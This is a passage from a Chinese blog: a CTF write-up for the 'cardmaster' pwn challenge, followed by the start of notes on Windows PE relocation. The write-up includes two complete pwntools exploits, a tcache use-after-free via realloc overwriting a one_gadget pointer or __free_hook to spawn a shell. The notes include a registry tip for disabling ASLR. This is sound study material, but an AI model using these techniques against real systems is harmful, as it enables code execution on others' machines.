<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// docker ubuntu18 下编译</span></span><br><span class="line"><span class="comment">// gcc -z lazy -z noexecstack -no-pie -fno-stack-protector -g -o ./test ./test.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)a = a + <span class="number">0x30</span>;</span><br><span class="line">	**(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>**)a = a + <span class="number">0x60</span>;</span><br><span class="line">	a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行完最后一次 <code>malloc</code> 之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [ -2]: 0</span><br></pre></td></tr></table></figure>

<p>另外，还有一个特性是，对于已存放到 tcache 的指针，<code>realloc</code> 重新申请这个堆不会删除 tcache 中的记录，会导致 uaf。<br>例如 exp 中有这样一段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span></span><br><span class="line"><span class="comment"># 通过 uaf 修改 tcache fd 内容</span></span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(mng_mem))</span><br></pre></td></tr></table></figure>
<p>这里为什么可以修改 tcache 的 <code>fd</code> 呢？动调可以得知为什么。<br>首先是第一句 <code>setinfo(128, 0, 0, b&#39;a&#39;)</code>，会申请堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x5591c3c01231    call   malloc@plt                  &lt;malloc@plt&gt;</span><br><span class="line">       size: 0x200</span><br></pre></td></tr></table></figure>
<p>然后第二句 <code>setinfo(0, 0, 0)</code>，会释放堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x5591c3c01218    call   realloc@plt                 &lt;realloc@plt&gt;</span><br><span class="line">        ptr: 0x5591c56c9e00 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">        size: 0</span><br><span class="line">        </span><br><span class="line">执行后：</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x5591c56c9a50 ◂— 0</span><br><span class="line">0x60 [  1]: 0x5591c56c9670 ◂— 0</span><br><span class="line">0x210 [  1]: 0x5591c56c9e00 ◂— 0</span><br></pre></td></tr></table></figure>
<p>第三句 <code>setinfo(128, 0, 0, flat(mng_mem))</code> 奇特的点来了。由于 <code>ptr_record</code> 存放了先前已经被 <code>realloc</code> free 掉了的指针，所以再调用 <code>realloc</code> 理论上来说会扩展 &#x2F; 重新申请这个堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x5591c3c01218    call   realloc@plt                 &lt;realloc@plt&gt;</span><br><span class="line">       ptr: 0x5591c56c9e00 ◂— 0</span><br><span class="line">       size: 0x200</span><br></pre></td></tr></table></figure>
<p>但是执行了 <code>realloc</code> 之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x5591c3c0121d    mov    qword ptr [rbp - 0x18], rax     [0x7ffe0ce347d8] =&gt; 0x5591c56c9e00 ◂— 0</span><br><span class="line"> </span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x5591c56c9a50 ◂— 0</span><br><span class="line">0x60 [  1]: 0x5591c56c9670 ◂— 0</span><br><span class="line">0x210 [  1]: 0x5591c56c9e00 ◂— 0</span><br><span class="line">0x410 [  1]: 0x5591c56ca010 ◂— 0</span><br></pre></td></tr></table></figure>
<p>tcachebin 没有更新，但是 <code>realloc</code> 依旧返回了原来的指针，产生 uaf。<br><del>这一段可以查源码得知为什么，但是这里懒得展开讲了。</del></p>
<h1 id="exp1：修改堆上指针为-one-gadget"><a href="#exp1：修改堆上指针为-one-gadget" class="headerlink" title="exp1：修改堆上指针为 one_gadget"></a>exp1：修改堆上指针为 one_gadget</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y : p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y : p.sendlineafter(x, y)</span><br><span class="line">suheap = <span class="keyword">lambda</span> x : success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line">sulibc = <span class="keyword">lambda</span> x : success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p, gdbscript = gs)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setinfo</span>(<span class="params">count, ranges, lvl, content = <span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;suit count:&quot;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sla(<span class="string">b&quot;digit range 1 - ?&quot;</span>, <span class="built_in">str</span>(ranges).encode())</span><br><span class="line">    sla(<span class="string">b&quot;randomize level:&quot;</span>, <span class="built_in">str</span>(lvl).encode())</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        sa(<span class="string">b&quot;new suite set:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">og = <span class="literal">False</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> og:</span><br><span class="line">        ru(<span class="string">b&#x27;chara set:&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showcards</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">og = <span class="number">0x10a38c</span><span class="comment"># 0x4f2be 0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./cardmaster&#x27;</span></span><br><span class="line">elf = ELF(name, checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">p = process(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">setinfo(<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;abcd&#x27;</span>)</span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">getinfo()</span><br><span class="line">heapbase = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">suheap(heapbase)</span><br><span class="line">mng_mem = heapbase + <span class="number">0x1420</span><span class="comment"># 该偏移由下面多次 init 之后得到。指向最后创建的管理堆。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">1112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">getinfo()</span><br><span class="line">base = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">sulibc(base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf tcache bins attack</span></span><br><span class="line"><span class="comment"># 3ubuntu1 bugs</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span></span><br><span class="line"><span class="comment"># 通过 uaf 修改 tcache fd 内容</span></span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(mng_mem))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 210</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># init and malloc to -1</span></span><br><span class="line">init()</span><br><span class="line">og += base</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, og))</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">getinfo(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="exp2：打-freehook"><a href="#exp2：打-freehook" class="headerlink" title="exp2：打 freehook"></a>exp2：打 freehook</h1><p>另外还有一篇 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/91ac0m0/p/18573018">wp</a> 是打 freehook 的，基本同理，而且比较简单。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y : p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y : p.sendlineafter(x, y)</span><br><span class="line">sulibc = <span class="keyword">lambda</span> x : success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(choice).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setinfo</span>(<span class="params">count, ranges, lvl, content = <span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;suit count:&quot;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sla(<span class="string">b&quot;digit range 1 - ?&quot;</span>, <span class="built_in">str</span>(ranges).encode())</span><br><span class="line">    sla(<span class="string">b&quot;randomize level:&quot;</span>, <span class="built_in">str</span>(lvl).encode())</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        sa(<span class="string">b&quot;new suite set:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">og = <span class="literal">False</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> og:</span><br><span class="line">        ru(<span class="string">b&#x27;chara set:&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showcards</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;./cardmaster&#x27;</span></span><br><span class="line">elf = ELF(name, checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">p = process(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">setinfo(<span class="number">1112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># range 申请多个 block 阻止合并</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">getinfo()</span><br><span class="line">base = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">sulibc(base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf tcache bins attack</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410</span></span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment"># free</span></span><br><span class="line"><span class="comment"># uaf: 动调发现 realloc 不会直接申请 tcache</span></span><br><span class="line"><span class="comment"># 通过 uaf 修改 tcache fd 内容</span></span><br><span class="line">freehook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(freehook - <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 210</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 210 410 申请一次</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># init and malloc to -1</span></span><br><span class="line">init()</span><br><span class="line">setinfo(<span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, flat(<span class="number">0</span>, system))</span><br><span class="line"></span><br><span class="line">init()<span class="comment"># malloc 申请</span></span><br><span class="line">setinfo(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">setinfo(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这道题目，对 <code>realloc</code> 有了很多新的认识（<del>之前完全没有接触过</del>）。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.eqqie.cn/index.php/archives/1400/">https://www.eqqie.cn/index.php/archives/1400/</a><br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1986276-1-1.html">https://www.52pojie.cn/thread-1986276-1-1.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15808">https://xz.aliyun.com/news/15808</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/91ac0m0/p/18573018">https://www.cnblogs.com/91ac0m0/p/18573018</a></p>
</blockquote>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/">
    <time datetime="2025-10-28T11:50:43.000Z" class="entry-date">
        2025-10-28
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

    
    </footer>
</article>






  
    <article id="post-windows-重定位简单学习" class="post-windows-重定位简单学习 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">windows 重定位简单学习</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" data-id="cmjjqvfjm0004ekvg1l1z912l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>这篇博客是《逆向工程核心原理》第 16 章的读后笔记，可能存在较多内容上的不准确或缺失。</p>
</blockquote>
<p>pe 文件中的 pe 头指定了映像的加载地址位置（<code>ImageBase</code>）。当 pe 装载器检测到 <code>ImageBase</code> 位置已经加载了一个 pe 或 dll 时，就会将该 pe 重定位加载到其他内存位置，并修改程序中涉及到的有关地址。</p>
<p>Windows 的 ASLR &#x2F; 地址随机化似乎是在 Windows Vista 引入，且默认开启。<br>如果需要关闭 ASLR（小于 windows 10 的版本），则可以在注册表中查找：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages</code>（注意 images 复数），创建或修改其值为 0，即可关闭。</p>
<p><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/1.png"></p>
<p>（另外，有文章提到，设置注册表项为 -1 &#x2F; 2 是强制开启 ASLR，无论是否设置<code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code> 标识。windows 10 及以上版本可能需要其他位置设置才能关闭。Windows 平台上还有其他保护功能，例如 DEP。）</p>
<h1 id="PE-重定位原理"><a href="#PE-重定位原理" class="headerlink" title="PE 重定位原理"></a>PE 重定位原理</h1><ol>
<li>查找硬编码的地址位置；</li>
<li>读取地址存放值，减去 NT 头中的 <code>ImageBase</code> 得到偏移地址 RVA；</li>
<li>偏移地址 RVA + 重定位后的基址得到新的地址，放回原位完成重定位。</li>
</ol>
<h1 id="IMAGE-BASE-RELOCATION-结构体"><a href="#IMAGE-BASE-RELOCATION-结构体" class="headerlink" title="IMAGE_BASE_RELOCATION 结构体"></a><code>IMAGE_BASE_RELOCATION</code> 结构体</h1><p>PE 头中的 <code>_IMAGE_OPTIONAL_HEADER</code> 结构体有 <code>DataDirectory</code> 这个数组成员，其中包含了当前 PE 文件中的各个信息表，例如 EAT、IAT、资源表等等。<br><code>DataDirectory</code> 结构体定义如下。其中的 <code>VirtualAddress</code> 是映像（内存中）的 VA，<code>SIZE</code> 指示了某块内容所占内存大小。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>
<p><code>DataDirectory</code> 的第 6 项（数组索引第 5 项）是重定位表，其地址指向了重定位表。<br>重定位表涉及的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD VirtualAddress;</span><br><span class="line">    DWORD SizeOfBlock;</span><br><span class="line"><span class="comment">// WORD TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>
<p>一个程序中可能定义了多个重定位结构体，这些结构体在同一个地址段内且相邻（<code>.reloc</code>？）。<br>结构体的第一项是该重定位结构体中的所有项偏移，后续计算该结构体下所有的重定位地址都需要加上这个偏移；第二项是该重定位结构体的大小。<br>第三项是被注释的，表示一个重定位结构体中可能会存在多个重定位地址。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>此处以 Windows 7 x64 下的 <code>MineSweeper.exe</code> 为例。<br>使用 CFF EXPLORER 可以很容易地看到重定位表的信息。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/2.png"><br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/3.png"></p>
<p>当然，也可以不借助任何工具，纯手算。<br>首先，根据 MAGIC NUMBER：0x50 0x45 0x0 0x0（”PE\x00\x00”），找到 PE 头 <code>IMAGE_NT_HEADER</code> 的位置。此处地址是 0xF0。<br>然后再从该地址开始，加上 <code>IMAGE_FILE_HEADER</code> 结构体的大小，就可以找到 <code>OptionalHeader</code> 的位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p><code>IMAGE_FILE_HEADER</code> 的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">定义</a>，此处不展开细讲。其大小为 20 字节。<br>所以 <code>OptionalHeader</code> 位置为 0xF0 + 20 + 4（magic） &#x3D; 0x108。<br>然后查看微软官网的解释：<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory">https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory</a><br>重定位表在距离 <code>OptionalHeader</code> 的 +136&#x2F;+152 位置。<br>由于是 64 位，所以是 +152。<br>所以 0x108 + 152 &#x3D; 0x1A0，即重定位表的 RVA 位置。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/4.png"></p>
<p>运行程序至入口点，观察基址为 0xFFE30000。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/5.png"></p>
